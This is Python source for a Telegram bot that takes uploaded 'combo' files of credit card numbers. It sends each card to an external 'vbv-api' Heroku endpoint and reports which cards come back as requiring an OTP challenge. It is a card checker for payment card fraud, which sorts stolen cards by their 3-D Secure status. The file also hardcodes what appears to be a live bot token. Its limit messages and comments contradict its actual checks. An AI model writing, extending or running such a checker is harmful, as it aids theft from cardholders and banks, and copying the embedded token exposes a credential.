import telebot
import requests
import os
import time
from datetime import datetime, timedelta
API_URL = 'https://vbv-api-35b0ab661f11.herokuapp.com/'
bot = telebot.TeleBot('7047222833:AAF5Pq-TXVC2m3htnzwRUvnq8w7YnPMDtyU')

# Store last interaction time for each user
user_last_interaction = {}

def get_user_last_interaction(user_id):
    return user_last_interaction.get(user_id, 0)

def set_user_last_interaction(user_id):
    user_last_interaction[user_id] = time.time()

@bot.message_handler(commands=["start"])
def start(message):
    bot.reply_to(message, f"   𝗪𝗼𝗿𝗸𝗶𝗻𝗴 𝗕𝗼𝘁  \n  𝐘𝐨𝐮 𝐚𝐫𝐞 𝐂𝐨𝐦𝐛𝐨 𝐭𝐱𝐭 𝐅𝐢𝐥𝐞 𝐒𝐞𝐧𝐝 𝐍𝐨𝐰 🇮🇶")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    user_id = message.from_user.id
    if time.time() - get_user_last_interaction(user_id) < 1:  # 2 minutes
        bot.reply_to(message, "انتضر 3 دقائق")
        return

    set_user_last_interaction(user_id)

    try:
        process_file(message)
    except Exception as e:
        bot.reply_to(message, f"An error occurred while processing your file. {e}")

def process_file(message):
    name = message.from_user.first_name
    ko = bot.reply_to(message, f"𝗔𝗹𝗿𝗶𝗴𝗵𝘁 {name}, 𝘆𝗼𝘂𝗿 𝗳𝗶𝗹𝗲 𝗶𝘀 𝗯𝗲𝗶𝗻𝗴 𝗽𝗿𝗼𝗰𝗲𝘀𝘀𝗲𝗱...")

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)

    with open(f'temp_{message.from_user.id}.txt', 'wb') as f:
        f.write(downloaded_file)

    cards = read_cards_from_file(message.from_user.id)
    approved_cards = validate_cards(cards,ko,message)

    if approved_cards:
        print('done')
    else:
        bot.reply_to(message, f"𝙉𝙤 𝙢𝙖𝙩𝙘𝙝𝙞𝙣𝙜 𝙧𝙚𝙨𝙪𝙡𝙩𝙨 𝙛𝙤𝙪𝙣𝙙.")

    os.remove(f'temp_{message.from_user.id}.txt')

def read_cards_from_file(user_id):
    with open(f'temp_{user_id}.txt', 'r') as f:
        return [line.strip() for line in f.readlines()]

def validate_cards(cards,ko,message):
    approved_cards = []
    for card in cards:
        if len(cards) > 100000000000:
            bot.reply_to(ko, f"𝗘𝗿𝗿𝗼𝗿: 𝗧𝗵𝗲 𝗺𝗮𝘅𝗶𝗺𝘂𝗺 𝗻𝘂𝗺𝗯𝗲𝗿 𝗼𝗳 𝗰𝗿𝗲𝗱𝗶𝘁 𝗰𝗮𝗿𝗱𝘀 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝗶𝘀 «100». 𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝗮 𝘀𝗺𝗮𝗹𝗹𝗲𝗿 𝗳𝗶𝗹𝗲.")
            return []
        response = requests.get(API_URL + card)
        msg = response.json()['result']
        print(response.text)
        if  'Challenge Required' in response.text:
            mcvv = f'''<b>𖣌 ᴄᴀʀᴅ ≫ <code>{card}</code> is OTP 🔴
𖣌 coded by  ≫ <a href='tg://user?id=5626676151'>🎯👑  AHMED  ♩♠</a> </b>'''
            bot.reply_to(message, mcvv, parse_mode='html')
            approved_cards.append(card)
    return approved_cards
bot.polling()
